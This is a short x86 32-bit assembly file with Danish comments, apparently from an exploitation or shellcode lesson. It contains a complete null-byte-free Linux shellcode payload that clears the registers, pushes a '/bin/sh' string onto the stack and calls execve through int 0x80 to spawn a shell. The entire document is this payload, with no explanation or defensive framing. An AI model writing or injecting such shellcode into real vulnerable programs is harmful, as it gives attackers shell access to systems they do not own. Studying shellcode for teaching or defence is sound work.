[BITS 32]

    ; Clear alle registre
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    ; Push strengen
    push `X/sh`
        pop edi
        shr edi, 8
        push edi
    push `/bin`

    ; Kald styresystemet
    mov al, 11
    mov ebx, esp
    int 0x80
